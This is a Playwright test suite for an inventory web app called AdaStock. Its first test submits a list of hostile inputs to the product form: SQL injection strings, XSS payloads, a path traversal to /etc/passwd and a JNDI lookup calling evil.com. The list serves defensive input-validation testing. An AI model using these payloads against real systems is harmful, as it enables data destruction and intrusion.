import { test, expect, Page } from '@playwright/test';

/**
 * 😈 Pessimistic Testing - Edge Cases & Breaking Points
 * 
 * This test suite is designed to be mean and find problems.
 * We test all the ways Jessica (or a malicious user) could break the system.
 */

test.describe('😈 Pessimistic Edge Cases - Breaking the System', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    await expect(page.locator('h1')).toContainText('AdaStock');
    
    // Switch to Products view
    const productsTab = page.locator('button:has-text("Producten"), button:has-text("Products")');
    if (await productsTab.isVisible()) {
      await productsTab.click();
    }
  });

  test('💥 SQL Injection & XSS Attempts in Product Names', async ({ page }) => {
    console.log('🧪 Testing: Malicious input handling');
    
    const maliciousInputs = [
      "'; DROP TABLE products; --",
      "<script>alert('XSS')</script>",
      "Robert'); DROP TABLE students;--",
      "<img src=x onerror=alert('XSS')>",
      "' OR '1'='1",
      "'; UPDATE products SET name='HACKED'; --",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
    ];
    
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    
    for (const maliciousInput of maliciousInputs) {
      console.log(`Testing input: ${maliciousInput.substring(0, 30)}...`);
      
      await addButton.click();
      
      const modal = page.locator('[role="dialog"], .modal, .bg-white.rounded-lg.p-6');
      await expect(modal).toBeVisible();
      
      // Try to inject malicious code
      const nameInput = page.locator('input[placeholder*="tomaten"], input[placeholder*="Fresh"], #product-name');
      await nameInput.fill(maliciousInput);
      
      // Fill other required fields
      await page.locator('select[name="category"], #category').selectOption({ index: 1 });
      await page.fill('input[type="number"][placeholder="0"]', '1');
      await page.locator('input[type="number"]').nth(1).fill('1');
      
      // Try to submit
      await page.locator('button:has-text("toevoegen"), button:has-text("Add"), button[type="submit"]').click();
      
      // Verify the system handled it safely
      await page.waitForTimeout(1000);
      
      // Check if error dialog appeared (good) or if it was processed (need to verify it's sanitized)
      const errorMsg = page.locator('text=error, text=invalid, text=required');
      const successMsg = page.locator(`text=${maliciousInput}`);
      
      if (await successMsg.isVisible()) {
        // Verify it's displayed safely (no script execution)
        expect(await page.locator('script').count()).toBe(0);
        console.log(`⚠️ Input was accepted but seems sanitized`);
      } else {
        console.log(`✅ Malicious input was rejected`);
      }
      
      // Close modal if still open
      const closeBtn = page.locator('button:has-text("×"), button[aria-label="close"]');
      if (await closeBtn.isVisible()) {
        await closeBtn.click();
      }
    }
  });

  test('🔢 Extreme Numeric Values', async ({ page }) => {
    console.log('🧪 Testing: Extreme numeric inputs');
    
    const extremeValues = [
      '-999999999',
      '999999999999999999',
      '0.0000000001',
      '1e+100',
      'NaN',
      'Infinity',
      '-Infinity',
      '1/0',
      '0/0',
    ];
    
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    await addButton.click();
    
    const modal = page.locator('[role="dialog"], .modal');
    await expect(modal).toBeVisible();
    
    // Fill basic info
    await page.fill('#product-name', 'Extreme Test Product');
    await page.locator('select[name="category"]').selectOption({ index: 1 });
    
    for (const value of extremeValues) {
      console.log(`Testing quantity: ${value}`);
      
      const quantityInput = page.locator('input[type="number"][placeholder="0"]');
      await quantityInput.clear();
      await quantityInput.fill(value);
      
      // Try to submit
      await page.locator('button[type="submit"]').click();
      
      // Check for validation errors
      const errorMsg = page.locator('.text-red-500, .text-ada-error, text=invalid');
      if (await errorMsg.isVisible()) {
        console.log(`✅ Validation error shown for ${value}`);
      } else {
        console.log(`⚠️ Value ${value} was accepted`);
      }
      
      await page.waitForTimeout(500);
    }
  });

  test('🚫 Empty and Whitespace-Only Inputs', async ({ page }) => {
    console.log('🧪 Testing: Empty and whitespace validation');
    
    const invalidInputs = [
      '',
      ' ',
      '   ',
      '\n',
      '\t',
      '   \n   \t   ',
    ];
    
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    
    for (const input of invalidInputs) {
      await addButton.click();
      const modal = page.locator('[role="dialog"], .modal');
      await expect(modal).toBeVisible();
      
      // Try empty/whitespace product name
      await page.fill('#product-name', input);
      await page.locator('select[name="category"]').selectOption({ index: 1 });
      await page.fill('input[type="number"][placeholder="0"]', '1');
      
      await page.locator('button[type="submit"]').click();
      
      // Should show validation error
      const errorMsg = page.locator('.text-red-500, .text-ada-error, text=required');
      await expect(errorMsg).toBeVisible({ timeout: 3000 });
      console.log(`✅ Empty input validation works for: "${input}"`);
      
      // Close modal
      const closeBtn = page.locator('button:has-text("×"), button[aria-label="close"]');
      await closeBtn.click();
    }
  });

  test('⚡ Rapid Fire Clicking (Race Conditions)', async ({ page }) => {
    console.log('🧪 Testing: Race conditions with rapid clicking');
    
    // Wait for products to load
    await expect(page.locator('.product-card, tr').first()).toBeVisible({ timeout: 10000 });
    
    // Find quantity update buttons
    const plusBtns = page.locator('button:has-text("+1"), button:has-text("+5")');
    
    if (await plusBtns.first().isVisible()) {
      const firstBtn = plusBtns.first();
      
      // Get initial quantity
      const parentProduct = firstBtn.locator('..').locator('..'); // Navigate up to product container
      const initialQuantity = await parentProduct.locator('.font-bold, .quantity').textContent();
      
      console.log(`Initial quantity: ${initialQuantity}`);
      
      // Rapidly click the button multiple times
      for (let i = 0; i < 10; i++) {
        await firstBtn.click();
        // Minimal delay to test race conditions
        await page.waitForTimeout(50);
      }
      
      // Wait for all updates to settle
      await page.waitForTimeout(3000);
      
      const finalQuantity = await parentProduct.locator('.font-bold, .quantity').textContent();
      console.log(`Final quantity: ${finalQuantity}`);
      
      // The system should handle race conditions gracefully
      console.log('✅ Rapid clicking test completed (check for consistency)');
    }
  });

  test('🌐 Network Timeout Simulation', async ({ page }) => {
    console.log('🧪 Testing: Network timeout handling');
    
    // Block all API requests to simulate network issues
    await page.route('**/api/**', route => {
      // Delay response for 30+ seconds to simulate timeout
      setTimeout(() => {
        route.abort();
      }, 30000);
    });
    
    // Try to add a product during network issues
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    await addButton.click();
    
    const modal = page.locator('[role="dialog"], .modal');
    await expect(modal).toBeVisible();
    
    await page.fill('#product-name', 'Network Test Product');
    await page.locator('select[name="category"]').selectOption({ index: 1 });
    await page.fill('input[type="number"][placeholder="0"]', '5');
    
    await page.locator('button[type="submit"]').click();
    
    // Should show loading state or error
    const loadingIndicator = page.locator('.animate-spin, text=loading, text=waiting');
    const errorMsg = page.locator('text=error, text=failed, .bg-red-50');
    
    // Wait up to 10 seconds for some kind of feedback
    await Promise.race([
      expect(loadingIndicator).toBeVisible({ timeout: 10000 }),
      expect(errorMsg).toBeVisible({ timeout: 10000 }),
    ]).catch(() => {
      console.log('⚠️ No loading or error feedback shown during network timeout');
    });
    
    console.log('✅ Network timeout test completed');
  });

  test('🔄 Concurrent User Simulation', async ({ page, context }) => {
    console.log('🧪 Testing: Multiple users editing simultaneously');
    
    // Open another tab to simulate another user
    const page2 = await context.newPage();
    await page2.goto('/');
    await expect(page2.locator('h1')).toContainText('AdaStock');
    
    // Switch both to products view
    for (const testPage of [page, page2]) {
      const productsTab = testPage.locator('button:has-text("Producten"), button:has-text("Products")');
      if (await productsTab.isVisible()) {
        await productsTab.click();
      }
    }
    
    // Wait for products to load on both pages
    await expect(page.locator('.product-card, tr').first()).toBeVisible({ timeout: 10000 });
    await expect(page2.locator('.product-card, tr').first()).toBeVisible({ timeout: 10000 });
    
    // Both "users" try to edit the same product simultaneously
    const editBtns1 = page.locator('button:has-text("Edit"), .edit-button');
    const editBtns2 = page2.locator('button:has-text("Edit"), .edit-button');
    
    if (await editBtns1.first().isVisible() && await editBtns2.first().isVisible()) {
      // Start editing on both tabs at the same time
      await Promise.all([
        editBtns1.first().click(),
        editBtns2.first().click(),
      ]);
      
      // Both try to update the quantity
      const input1 = page.locator('input[type="number"]:focus');
      const input2 = page2.locator('input[type="number"]:focus');
      
      if (await input1.isVisible()) {
        await input1.fill('100');
        await page.keyboard.press('Enter');
      }
      
      if (await input2.isVisible()) {
        await input2.fill('200');
        await page2.keyboard.press('Enter');
      }
      
      // Wait for updates to resolve
      await page.waitForTimeout(3000);
      
      console.log('✅ Concurrent editing test completed');
    }
    
    await page2.close();
  });

  test('📱 Extreme Screen Sizes', async ({ page }) => {
    console.log('🧪 Testing: Extreme viewport sizes');
    
    const extremeViewports = [
      { width: 320, height: 568, name: 'iPhone 5 (very narrow)' },
      { width: 1920, height: 1080, name: 'Full HD (very wide)' },
      { width: 360, height: 640, name: 'Small Android' },
      { width: 414, height: 896, name: 'iPhone XR' },
      { width: 768, height: 1024, name: 'iPad' },
      { width: 1024, height: 768, name: 'iPad Landscape' },
      { width: 2560, height: 1440, name: 'QHD Monitor' },
    ];
    
    for (const viewport of extremeViewports) {
      console.log(`Testing viewport: ${viewport.name} (${viewport.width}x${viewport.height})`);
      
      await page.setViewportSize({ width: viewport.width, height: viewport.height });
      
      // Verify critical elements are still accessible
      await expect(page.locator('h1')).toBeVisible();
      
      const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
      if (await addButton.isVisible()) {
        console.log(`✅ Add button visible on ${viewport.name}`);
      } else {
        console.log(`⚠️ Add button not visible on ${viewport.name}`);
      }
      
      // Check if horizontal scrolling is needed (should be avoided)
      const bodyWidth = await page.evaluate(() => document.body.scrollWidth);
      const viewportWidth = viewport.width;
      
      if (bodyWidth > viewportWidth + 20) { // 20px tolerance
        console.log(`⚠️ Horizontal scroll needed on ${viewport.name}: body ${bodyWidth}px > viewport ${viewportWidth}px`);
      } else {
        console.log(`✅ No horizontal scroll on ${viewport.name}`);
      }
      
      await page.waitForTimeout(500);
    }
  });

  test('🐌 Performance Under Load', async ({ page }) => {
    console.log('🧪 Testing: Performance with large datasets');
    
    // Add many products rapidly to test performance
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    
    const startTime = Date.now();
    
    // Add 5 products quickly (simulating busy restaurant data entry)
    for (let i = 0; i < 5; i++) {
      await addButton.click();
      
      const modal = page.locator('[role="dialog"], .modal');
      await expect(modal).toBeVisible();
      
      await page.fill('#product-name', `Bulk Product ${i + 1}`);
      await page.locator('select[name="category"]').selectOption({ index: (i % 3) + 1 });
      await page.fill('input[type="number"][placeholder="0"]', String(i + 1));
      await page.locator('input[type="number"]').nth(1).fill('1');
      
      await page.locator('button[type="submit"]').click();
      
      // Wait for modal to close
      await expect(modal).not.toBeVisible({ timeout: 5000 });
    }
    
    const endTime = Date.now();
    const totalTime = endTime - startTime;
    
    console.log(`⏱️ Added 5 products in ${totalTime}ms (${totalTime/5}ms per product)`);
    
    // Test scrolling performance
    const scrollStartTime = Date.now();
    
    for (let i = 0; i < 10; i++) {
      await page.mouse.wheel(0, 200);
      await page.waitForTimeout(50);
    }
    
    const scrollEndTime = Date.now();
    console.log(`⏱️ Scroll test completed in ${scrollEndTime - scrollStartTime}ms`);
    
    // Test search performance
    const searchInput = page.locator('input[placeholder*="Zoek"], input[placeholder*="Search"]');
    if (await searchInput.isVisible()) {
      const searchStartTime = Date.now();
      
      await searchInput.fill('Bulk');
      await page.waitForTimeout(1000); // Wait for debounced search
      
      const searchEndTime = Date.now();
      console.log(`⏱️ Search completed in ${searchEndTime - searchStartTime}ms`);
    }
    
    console.log('✅ Performance testing completed');
  });

  test('🔒 Input Validation Boundaries', async ({ page }) => {
    console.log('🧪 Testing: Input validation edge cases');
    
    const addButton = page.locator('button:has-text("Product Toevoegen"), button:has-text("Add Product")');
    await addButton.click();
    
    const modal = page.locator('[role="dialog"], .modal');
    await expect(modal).toBeVisible();
    
    // Test maximum length product names
    const longName = 'A'.repeat(1000);
    await page.fill('#product-name', longName);
    
    // Verify it's truncated or rejected
    const actualValue = await page.locator('#product-name').inputValue();
    if (actualValue.length < longName.length) {
      console.log(`✅ Product name truncated to ${actualValue.length} characters`);
    } else {
      console.log(`⚠️ Very long product name accepted: ${actualValue.length} characters`);
    }
    
    // Test decimal precision
    await page.locator('select[name="category"]').selectOption({ index: 1 });
    await page.fill('input[type="number"][placeholder="0"]', '12.3456789123456789');
    
    const quantityValue = await page.locator('input[type="number"][placeholder="0"]').inputValue();
    console.log(`Quantity precision: ${quantityValue}`);
    
    // Test minimum stock validation
    await page.locator('input[type="number"]').nth(1).fill('-5');
    
    await page.locator('button[type="submit"]').click();
    
    // Should show validation error for negative minimum stock
    const errorMsg = page.locator('.text-red-500, .text-ada-error');
    if (await errorMsg.isVisible()) {
      console.log('✅ Negative minimum stock validation works');
    } else {
      console.log('⚠️ Negative minimum stock was accepted');
    }
    
    console.log('✅ Input validation boundary testing completed');
  });
});